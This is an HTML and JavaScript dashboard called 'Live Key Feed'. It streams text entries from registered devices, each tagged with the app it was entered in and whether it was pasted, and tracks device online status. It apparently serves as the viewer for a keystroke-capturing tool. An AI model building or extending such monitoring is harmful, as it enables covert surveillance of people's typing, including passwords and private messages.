<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Live Key Feed</title>
  <style>
    :root {
      --bg-1: #07131f;
      --bg-2: #17243a;
      --panel: rgba(9, 17, 29, 0.92);
      --bubble: linear-gradient(135deg, #1769aa, #159aab);
      --pasted-bubble: linear-gradient(135deg, #9a4d18, #c9791a);
      --text: #eff8ff;
      --muted: #9db4c9;
      --accent: #78d9d1;
      --border: rgba(157, 190, 209, 0.18);
      --shadow: rgba(0, 0, 0, 0.42);
    }

    * { box-sizing: border-box; }
    html, body {
      margin: 0;
      height: 100%;
      font-family: "Trebuchet MS", "Segoe UI", sans-serif;
      background: radial-gradient(circle at 15% 0%, rgba(120, 217, 209, 0.18), transparent 28%), radial-gradient(circle at 100% 100%, rgba(52, 115, 190, 0.18), transparent 34%), linear-gradient(135deg, var(--bg-1), var(--bg-2));
      color: var(--text);
    }
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100dvh;
      padding: 24px;
    }
    .app {
      width: min(100%, 1180px);
      height: min(90dvh, 820px);
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 24px;
      overflow: hidden;
      box-shadow: 0 28px 80px var(--shadow);
      display: flex;
      flex-direction: column;
      backdrop-filter: blur(12px);
    }
    .workspace {
      display: grid;
      grid-template-columns: 210px minmax(0, 1fr) 270px;
      flex: 1;
      min-height: 0;
    }
    .sidebar {
      padding: 20px 16px;
      border-right: 1px solid var(--border);
      background: rgba(10, 19, 31, 0.58);
    }
    .sidebar h2 {
      margin: 0 0 18px;
      color: var(--accent);
      font-size: 0.72rem;
      letter-spacing: 0.12em;
      text-transform: uppercase;
    }
    .metric {
      padding: 12px 0;
      border-top: 1px solid var(--border);
    }
    .metric-label {
      display: block;
      margin-bottom: 5px;
      color: var(--muted);
      font-size: 0.68rem;
      text-transform: uppercase;
      letter-spacing: 0.06em;
    }
    .metric-value {
      display: block;
      font-size: 0.82rem;
      line-height: 1.4;
      overflow-wrap: anywhere;
    }
    .feed-panel {
      display: flex;
      min-width: 0;
      min-height: 0;
      flex-direction: column;
    }
    .devices-panel {
      min-width: 0;
      padding: 20px 16px;
      border-left: 1px solid var(--border);
      background: rgba(10, 19, 31, 0.58);
      overflow-y: auto;
    }
    .devices-heading {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 8px;
      margin-bottom: 16px;
    }
    .devices-heading h2 {
      margin: 0;
      color: var(--accent);
      font-size: 0.72rem;
      letter-spacing: 0.12em;
      text-transform: uppercase;
    }
    .device-summary {
      display: flex;
      justify-content: space-between;
      gap: 8px;
      margin: -8px 0 8px;
      color: var(--muted);
      font-size: 0.62rem;
    }
    .online-count { color: #86efac; }
    .device-refresh { white-space: nowrap; }
    .device-count {
      color: var(--muted);
      font-size: 0.7rem;
    }
    .device-list {
      display: grid;
      gap: 10px;
    }
    .device-row {
      padding: 10px 0;
      border-top: 1px solid var(--border);
    }
    .device-row.online { border-top-color: rgba(34, 197, 94, 0.24); }
    .device-name {
      display: block;
      overflow-wrap: anywhere;
      font-size: 0.78rem;
      font-weight: 700;
    }
    .device-id,
    .device-seen {
      display: block;
      margin-top: 4px;
      color: var(--muted);
      font-size: 0.66rem;
      overflow-wrap: anywhere;
    }
    .device-state {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      margin-top: 7px;
      font-size: 0.66rem;
      font-weight: 700;
    }
    .device-state::before {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: #64748b;
      content: "";
    }
    .device-state.online { color: #86efac; }
    .device-state.online::before {
      background: #22c55e;
      box-shadow: 0 0 10px rgba(34, 197, 94, 0.8);
    }
    .device-state.offline { color: #fbbf93; }
    .device-state.offline::before { background: #f97316; }
    .topbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 20px;
      background: rgba(8, 16, 27, 0.94);
      border-bottom: 1px solid var(--border);
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 700;
      letter-spacing: 0.14em;
      text-transform: uppercase;
      font-size: 0.72rem;
      color: var(--accent);
    }
    .dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: #22c55e;
      box-shadow: 0 0 14px rgba(34, 197, 94, 0.9);
    }
    .topbar-meta {
      display: flex;
      align-items: center;
      gap: 10px;
      color: var(--muted);
      font-size: 0.68rem;
      letter-spacing: 0.04em;
      text-transform: uppercase;
    }
    .stream-pill {
      padding: 5px 9px;
      border: 1px solid rgba(120, 217, 209, 0.28);
      border-radius: 999px;
      color: var(--accent);
      background: rgba(120, 217, 209, 0.08);
      white-space: nowrap;
    }
    .status {
      padding: 15px 20px 0;
      color: var(--muted);
      font-size: 0.8rem;
      letter-spacing: 0.02em;
    }
    .feed {
      flex: 1;
      overflow-y: auto;
      padding: 18px 18px 24px;
      background: rgba(2, 6, 12, 0.12);
      scroll-behavior: smooth;
    }
    .feed:empty::before {
      display: block;
      padding: 12vh 24px;
      color: var(--muted);
      content: "No messages yet. Waiting for the first live event.";
      font-size: 0.86rem;
      text-align: center;
    }
    .bubble-wrap {
      display: flex;
      justify-content: flex-start;
      margin: 12px 0;
      animation: rise 0.22s ease;
    }
    .bubble {
      max-width: min(78%, 680px);
      background: var(--bubble);
      border: 1px solid rgba(255,255,255,0.12);
      border-radius: 18px 18px 18px 6px;
      padding: 12px 14px 10px;
      box-shadow: 0 12px 28px rgba(0,0,0,0.2);
      white-space: pre-wrap;
      word-break: break-word;
      line-height: 1.55;
    }
    .bubble.pasted {
      background: var(--pasted-bubble);
      border-color: rgba(253, 230, 138, 0.5);
    }
    .paste-label {
      display: block;
      margin-bottom: 6px;
      color: #fffbeb;
      font-size: 0.62rem;
      font-weight: 800;
      letter-spacing: 0.12em;
      text-transform: uppercase;
    }
    .time {
      display: block;
      margin-top: 6px;
      opacity: 0.82;
      font-size: 0.68rem;
      text-align: right;
    }
    .device {
      display: block;
      margin-top: 3px;
      opacity: 0.72;
      font-size: 0.64rem;
      text-align: left;
    }
    .source {
      display: block;
      margin-top: 3px;
      opacity: 0.82;
      font-size: 0.66rem;
      text-align: left;
    }
    @keyframes rise {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    @media (max-width: 900px) {
      .workspace { grid-template-columns: 180px minmax(0, 1fr) 230px; }
      .bubble { max-width: 86%; }
    }
    @media (max-width: 720px) {
      body { padding: 8px; }
      .app { height: calc(100dvh - 16px); min-height: 480px; border-radius: 18px; }
      .topbar { padding: 14px 16px; }
      .topbar-meta { font-size: 0.6rem; }
      .workspace {
        grid-template-columns: 1fr;
        grid-template-rows: auto minmax(0, 1fr) auto;
      }
      .sidebar {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 10px;
        padding: 12px 14px 13px;
        border-right: 0;
        border-bottom: 1px solid var(--border);
      }
      .sidebar h2 { grid-column: 1 / -1; margin: 0; }
      .metric { padding: 0; border-top: 0; }
      .metric-value { font-size: 0.72rem; }
      .status { padding: 12px 16px 0; font-size: 0.72rem; }
      .feed { padding: 12px 14px 18px; }
      .bubble { max-width: 92%; padding: 11px 12px 9px; }
      .devices-panel {
        border-top: 1px solid var(--border);
        border-left: 0;
        max-height: 156px;
        padding: 14px;
      }
      .devices-heading { margin-bottom: 8px; }
      .device-list { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px 14px; }
      .device-row { padding: 8px 0; }
    }
    @media (max-width: 420px) {
      .brand { font-size: 0.64rem; letter-spacing: 0.1em; }
      .topbar-meta { gap: 0; }
      .topbar-meta > span:first-child { display: none; }
      .sidebar { gap: 7px; }
      .metric-label { font-size: 0.58rem; }
      .metric-value { font-size: 0.66rem; }
      .device-list { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>
  <div class="app">
    <div class="topbar">
      <div class="brand"><span class="dot"></span> Live Key Feed</div>
      <div class="topbar-meta"><span>Realtime monitor</span><span class="stream-pill">Live stream</span></div>
    </div>
    <div class="workspace">
      <aside class="sidebar" aria-label="Service status">
        <h2>Service status</h2>
        <div class="metric">
          <span class="metric-label">Started</span>
          <span class="metric-value" id="startedAt">Loading…</span>
        </div>
        <div class="metric">
          <span class="metric-label">Current uptime</span>
          <span class="metric-value" id="uptime">Loading…</span>
        </div>
        <div class="metric">
          <span class="metric-label">Messages stored</span>
          <span class="metric-value" id="messageCount">0</span>
        </div>
      </aside>
      <section class="feed-panel">
        <div class="status" id="status">Waiting for live stream…</div>
        <div class="feed" id="feed"></div>
      </section>
      <aside class="devices-panel" aria-label="Connected devices">
        <div class="devices-heading">
          <h2>Devices</h2>
          <span class="device-count" id="deviceCount">0</span>
        </div>
        <div class="device-summary">
          <span class="online-count" id="onlineCount">0 online</span>
          <span class="device-refresh" id="deviceUpdated">Checking...</span>
        </div>
        <div class="device-list" id="deviceList">
          <span class="device-seen">Loading...</span>
        </div>
      </aside>
    </div>
  </div>

  <script>
    const feed = document.getElementById('feed');
    const statusEl = document.getElementById('status');
    const startedAtEl = document.getElementById('startedAt');
    const uptimeEl = document.getElementById('uptime');
    const messageCountEl = document.getElementById('messageCount');
    const deviceCountEl = document.getElementById('deviceCount');
    const onlineCountEl = document.getElementById('onlineCount');
    const deviceUpdatedEl = document.getElementById('deviceUpdated');
    const deviceListEl = document.getElementById('deviceList');
    let serviceStartedAt = null;
    let serviceUptime = 0;

    function formatTime(ts) {
      return new Date(ts).toLocaleString([], {
        dateStyle: 'medium',
        timeStyle: 'medium'
      });
    }

    function formatUptime(seconds) {
      const days = Math.floor(seconds / 86400);
      const hours = Math.floor((seconds % 86400) / 3600);
      const minutes = Math.floor((seconds % 3600) / 60);
      const remainingSeconds = seconds % 60;
      return `${days}d ${hours}h ${minutes}m ${remainingSeconds}s`;
    }

    function formatAge(seconds) {
      if (seconds < 60) return `${seconds}s ago`;
      if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
      return `${Math.floor(seconds / 3600)}h ago`;
    }

    function updateUptime() {
      if (serviceStartedAt === null) return;
      serviceUptime += 1;
      uptimeEl.textContent = formatUptime(serviceUptime);
    }

    async function loadDevices() {
      try {
        const res = await fetch('/api/devices');
        if (!res.ok) throw new Error('device check failed');
        const devices = await res.json();
        deviceCountEl.textContent = devices.length;
        onlineCountEl.textContent = `${devices.filter((device) => device.online).length} online`;
        deviceUpdatedEl.textContent = `Updated ${new Date().toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' })}`;
        deviceListEl.innerHTML = '';
        if (!devices.length) {
          deviceListEl.innerHTML = '<span class="device-seen">No devices registered</span>';
          return;
        }
        devices.forEach((device) => {
          const row = document.createElement('div');
          row.className = `device-row${device.online ? ' online' : ''}`;

          const name = document.createElement('span');
          name.className = 'device-name';
          name.textContent = device.name || 'Unknown device';

          const id = document.createElement('span');
          id.className = 'device-id';
          id.textContent = `ID: ${device.id || 'unknown'}`;

          const state = document.createElement('span');
          state.className = `device-state ${device.online ? 'online' : 'offline'}`;
          state.textContent = device.status || (device.online ? 'Online' : 'Offline');

          const uptime = document.createElement('span');
          uptime.className = 'device-seen';
          uptime.textContent = `Uptime: ${formatUptime(device.uptime_seconds || 0)}`;

          const seen = document.createElement('span');
          seen.className = 'device-seen';
          seen.textContent = device.last_seen
            ? `Last seen ${formatAge(device.last_seen_age_seconds || 0)}`
            : 'Last seen unknown';

          const joined = document.createElement('span');
          joined.className = 'device-seen';
          joined.textContent = device.joined_at
            ? `Joined ${formatTime(device.joined_at)}`
            : 'Joined date unknown';

          row.append(name, id, state, uptime, seen, joined);
          deviceListEl.appendChild(row);
        });
      } catch (err) {
        deviceListEl.innerHTML = '<span class="device-seen">Unavailable</span>';
      }
    }

    async function loadHealth() {
      try {
        const res = await fetch('/health');
        if (!res.ok) throw new Error('health check failed');
        const health = await res.json();
        serviceStartedAt = health.started_at;
        serviceUptime = health.uptime_seconds;
        startedAtEl.textContent = formatTime(serviceStartedAt);
        messageCountEl.textContent = health.count;
        updateUptime();
      } catch (err) {
        startedAtEl.textContent = 'Unavailable';
        uptimeEl.textContent = 'Unavailable';
      }
    }

    function addMessage(msg) {
      const wrap = document.createElement('div');
      wrap.className = 'bubble-wrap';

      const bubble = document.createElement('div');
      bubble.className = `bubble${msg.is_pasted ? ' pasted' : ''}`;
      bubble.textContent = msg.text;

      if (msg.is_pasted) {
        const label = document.createElement('span');
        label.className = 'paste-label';
        label.textContent = 'Pasted';
        bubble.prepend(label);
      }

      const time = document.createElement('span');
      time.className = 'time';
      time.textContent = formatTime(msg.time);
      bubble.appendChild(time);

      const device = document.createElement('span');
      device.className = 'device';
      device.textContent = `From device ${msg.device_id || 'unknown'}${msg.device_name ? ` (${msg.device_name})` : ''}`;
      bubble.appendChild(device);

      const source = document.createElement('span');
      source.className = 'source';
      source.textContent = `Entered in: ${msg.app_name || 'Unknown app'}`;
      bubble.appendChild(source);

      wrap.appendChild(bubble);
      feed.appendChild(wrap);
      messageCountEl.textContent = feed.children.length;
      feed.scrollTop = feed.scrollHeight;
    }

    async function loadInitialMessages() {
      try {
        const res = await fetch('/messages');
        if (!res.ok) throw new Error('failed');
        const messages = await res.json();
        feed.innerHTML = '';
        messages.forEach(addMessage);
        messageCountEl.textContent = messages.length;
        statusEl.textContent = 'Latest messages: ' + messages.length;
      } catch (err) {
        statusEl.textContent = 'Listening for new messages…';
      }
    }

    const eventSource = new EventSource('/events');
    eventSource.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      addMessage(msg);
      statusEl.textContent = 'Live stream connected';
    };
    eventSource.onerror = () => {
      statusEl.textContent = 'Reconnect in progress…';
    };

    loadInitialMessages();
    loadHealth();
    loadDevices();
    setInterval(updateUptime, 1000);
    setInterval(loadHealth, 30000);
    setInterval(loadDevices, 30000);
  </script>
</body>
</html>
